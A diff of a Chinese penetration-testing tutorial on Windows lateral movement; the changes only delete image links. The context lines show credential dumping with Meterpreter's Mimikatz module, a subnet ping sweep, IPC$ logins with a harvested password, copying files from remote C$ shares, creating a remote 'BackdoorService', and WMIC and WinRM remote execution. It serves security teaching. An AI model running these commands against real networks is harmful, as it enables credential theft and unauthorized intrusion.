@@ -4,7 +4,6 @@
 
 ## 概述
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_1.png)
 
 横向移动是渗透测试和内网渗透中的关键环节。当我们成功控制一台主机（跳板机）后，下一步就是利用这台主机作为跳板，去访问和控制同一网络内的其他主机。Windows系统自带了许多强大的管理工具，可以用于实现这一目的，而无需借助外部软件。
 
@@ -20,19 +19,14 @@
 
 ## 1. 信息收集与凭证获取 🔍
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_11.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_13.png)
 
 在开始横向移动之前，我们需要从已控制的主机上收集信息，特别是获取可用于登录其他主机的凭证。
 
 我们已经通过Meterpreter会话获取了`SYSTEM`权限。接下来可以进行信息收集。
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_15.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_17.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_19.png)
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_21.png)
 
@@ -40,9 +34,7 @@
 
 以下是获取当前主机明文密码的几种方法，使用Mimikatz模块：
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_24.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_26.png)
 
 ```
 meterpreter > load kiwi
@@ -62,9 +54,7 @@ Password: Password123!
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_31.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_33.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_35.png)
 
 我们还可以尝试其他命令来获取哈希或明文：
 ```
@@ -102,13 +92,10 @@ meterpreter > lsa_dump_secrets
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_60.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_62.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_64.png)
 
 在尝试连接其他主机前，我们需要知道目标网络中有哪些主机是存活的。
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_66.png)
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_68.png)
 
@@ -128,9 +115,7 @@ C:\> for /L %i in (1,1,254) do @ping -n 1 -w 50 10.10.10.%i | findstr "TTL"
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_78.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_80.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_82.png)
 
 假设探测发现IP地址为`10.10.10.201`的主机存活，并且它开放了`445`端口（文件共享服务）和`135`端口（RPC服务），这满足了IPC$连接的基本条件。
 
@@ -144,23 +129,17 @@ C:\> for /L %i in (1,1,254) do @ping -n 1 -w 50 10.10.10.%i | findstr "TTL"
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_90.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_92.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_94.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_96.png)
 
 IPC$（进程间通信）共享是Windows用于管理远程计算机的隐藏共享。建立IPC$连接后，可以进行文件操作、命令执行等。
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_98.png)
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_100.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_102.png)
 
 ### 建立IPC$连接
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_103.png)
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_105.png)
 
@@ -181,9 +160,7 @@ C:\> net use \\10.10.10.201\IPC$ Password123! /user:DE1\Administrator
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_115.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_117.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_119.png)
 
 ### IPC$连接的应用
 
@@ -203,9 +180,7 @@ C:\> net use \\10.10.10.201\IPC$ Password123! /user:DE1\Administrator
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_133.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_135.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_136.png)
 
 **访问远程文件系统：**
 ```
@@ -249,11 +224,8 @@ C:\> copy \\10.10.10.201\C$\important.txt C:\local_copy.txt
 C:\> net time \\10.10.10.201
 ```
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_159.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_161.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_163.png)
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_165.png)
 
@@ -353,7 +325,6 @@ SC命令可以远程创建、启动、停止服务。我们可以创建一个服
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_220.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_222.png)
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_224.png)
 
@@ -370,16 +341,13 @@ C:\> sc \\10.10.10.201 start BackdoorService
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_226.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_228.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_230.png)
 
 **查询服务状态：**
 ```
 C:\> sc \\10.10.10.201 qc BackdoorService
 ```
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_232.png)
 
 ## 6. 利用WMIC执行命令 💻
 
@@ -416,7 +384,6 @@ WinRM（Windows远程管理）是Windows的远程管理服务，默认在2012及
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_250.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_252.png)
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_253.png)
 
@@ -490,7 +457,6 @@ C:\> powershell -Command "$cred = Get-Credential; Invoke-WmiMethod -Class Win32_
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_290.png)
 
-![](img/fb9f3abd5c122b216896ee19ad4d6814_292.png)
 
 ![](img/fb9f3abd5c122b216896ee19ad4d6814_294.png)
 
